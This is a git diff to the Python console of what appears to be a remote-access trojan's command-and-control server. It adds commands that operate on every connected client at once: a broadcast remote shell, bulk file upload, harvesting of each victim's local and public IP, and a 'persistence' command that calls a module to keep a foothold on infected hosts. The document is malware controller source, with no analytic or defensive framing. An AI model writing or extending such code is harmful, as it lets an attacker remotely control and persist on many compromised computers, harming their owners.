@@ -3,10 +3,12 @@ from prompt_toolkit.history import InMemoryHistory
 from prompt_toolkit.completion import WordCompleter
 from src.ui.colors import Colors as cl
 from src.utils.client_handler import get_client_by_id, list_clients, clients, handle_client, remove_client
-from src.ui.help import show_main_help, show_client_help
+from src.ui.help import show_main_help, show_client_help, show_broadcast_help
 from src.utils.net_io import recv, send
+from src.utils.persistence import persistence
 import json
-from src.modules.shell_module import stream_shell
+import time
+from src.modules.shell_module import stream_shell, stream_broadcast_shell
 from src.modules.file_transfer import download, upload
 
 
@@ -53,7 +55,7 @@ def main_loop(sock):
                 list_clients(clients) 
 
             elif cmd.strip() == "broadcast": 
-                print("Broadcasting function logic to implimented later")
+                broadcast_loop(clients)
             else:
                 print(f"{cl.red}[!] Unknown command. Type 'help' for options.{cl.reset}")
         except KeyboardInterrupt:  
@@ -64,7 +66,7 @@ def main_loop(sock):
 def client_loop(client_info):
     """Handles the client-specific command loop"""
     cl_prompt = f"client_{client_info['ip']}> "
-    cl_commands = ["shell", "download", "upload", "help", "back"]  
+    cl_commands = ["shell", "download", "upload", "getip", "help", "back"]  
     completer = WordCompleter(cl_commands)  
     cl_session = PromptSession(completer=completer, history=InMemoryHistory())
     
@@ -93,6 +95,11 @@ def client_loop(client_info):
                     print(f"{cl.purple}Public IP:{cl.reset}\t {ip_info.get('pip', 'unknown')}")
                 continue
 
+            elif cmd == "persistence":
+                print(f"{cl.cyan}[*] Trying persistence...{cl.reset}")
+                persistence(client_info, cmd)
+                
+
             elif cmd == "back":
                 print(f"{cl.blue}[+] Returning to main session{cl.reset}")
                 break
@@ -103,6 +110,50 @@ def client_loop(client_info):
                 
             elif cmd:
                 print(f"{cl.red}[!] Unknown command. Type 'help' for options.{cl.reset}")
+                
+        except KeyboardInterrupt:
+            print(f"\n{cl.yellow}[!] Type 'back' to return to main session{cl.reset}")
+            continue
+
+def broadcast_loop(clients):
+    """Handles broadcasting commands to all users"""
+    br_commands = ["shell", "upload", "help", "back"]  
+    completer = WordCompleter(br_commands)  
+    br_session = PromptSession(completer=completer, history=InMemoryHistory())
+    
+    while True:
+        try:
+            cmd = br_session.prompt("broadcast> ")
+
+            if cmd == "back":
+                print(f"{cl.blue}[+] Returning to main session{cl.reset}")
+                return
+            
+            elif cmd == "help":
+                show_broadcast_help()
+                continue
+
+            if cmd == "shell":
+                    stream_broadcast_shell(clients, cmd)
+
+            for id, client_info in clients.items():
+                time.sleep(0.5)
+                if cmd.strip() == "upload":
+                    print(f"{cl.cyan}[*] {client_info['hostname']}{cl.reset}")
+                    upload(client_info['socket'], cmd)
+                    
+                elif cmd == "getip":
+                    print(f"{cl.cyan}[*] Requesting IP information...{cl.reset}")
+                    send(client_info['socket'], cmd)
+                    data = recv(client_info['socket'])
+                    if data:
+                        ip_info = json.loads(data.decode())
+                        print(f"{cl.purple}Hostname:{cl.reset}\t {client_info['hostname']}")
+                        print(f"{cl.purple}Local IP:{cl.reset}\t {ip_info.get('lip', 'unknown')}")
+                        print(f"{cl.purple}Public IP:{cl.reset}\t {ip_info.get('pip', 'unknown')}")
+                    
+        
+            #print(f"{cl.red}[!] Unknown command. Type 'help' for options.{cl.reset}")
                 
         except KeyboardInterrupt:
             print(f"\n{cl.yellow}[!] Type 'back' to return to main session{cl.reset}")
